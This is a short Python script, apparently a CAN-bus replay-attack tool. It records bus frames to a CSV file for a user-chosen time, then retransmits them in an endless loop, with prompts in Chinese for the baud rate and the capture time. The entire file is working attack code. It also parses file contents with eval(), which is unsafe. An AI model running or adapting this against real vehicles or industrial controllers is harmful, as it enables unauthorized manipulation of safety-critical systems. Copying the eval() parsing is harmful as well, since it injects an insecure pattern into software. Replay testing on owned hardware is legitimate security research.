from frame import Frame
from mydevice import MyDevice
import csv
import time
import os

class RepayAttack(MyDevice):
    def __init__(self):
        super(RepayAttack, self).__init__()


    def capture(self, number_time=10):
        if self.clear_buffer() is not True:
            ex = Exception("clear failure")
            raise ex

        else:
            print("begin")
            with open(os.path.dirname(os.path.realpath(__file__)) + os.sep + 'replay.csv', 'w', newline="") as csv_file:
                time0 = time.time()
                replay_writer = csv.writer(csv_file)

                while time.time() - time0 <= number_time:
                    data = self.receive()
                    p_list = []
                    for i in range(8):
                        p_list.append("0x" + "0" * (2 - len(hex(data.Data[i]).replace("0x", "")))
                                      + hex(data.Data[i]).replace("0x", ""))
                    replay_writer.writerow([hex(data.ID), p_list])
            print("end")

    def replay(self):
        #time = 1
       # print("replay start")
        with open(os.path.dirname(os.path.realpath(__file__)) + os.sep +'replay.csv', 'r', newline="") as file:
            readers = csv.reader(file)
            for read in readers:
                temp_list = []
                print(read[1])
                new_list = eval(read[1])
                for i in new_list:
                    temp_list.append(int(i, 16))
                send_frame = Frame(arb_id=int(read[0], 16), data=temp_list)
                self.transmit(tx_frame=send_frame)
               # print("relay:", time)
               # time += 1
        #print("replay end")

    def time_gap(self, i):
        print("count down")
        time.sleep(i)


if __name__ == "__main__":
    replay_attack = RepayAttack()
    print("请输入选择的波特率:\r\n"
          "125 or 500\r\n")
    baud_rate = int(input())
    replay_attack.start(baud_rate)
    try:
        print('请输入预计收集数据帧时间:\r\n')
        number_time = int(input())
        replay_attack.capture(number_time)
        replay_attack.time_gap(5)
        while True:
            replay_attack.replay()
    except Exception as result:
        print("unknown error :%s" % result)

    finally:
        replay_attack.stop()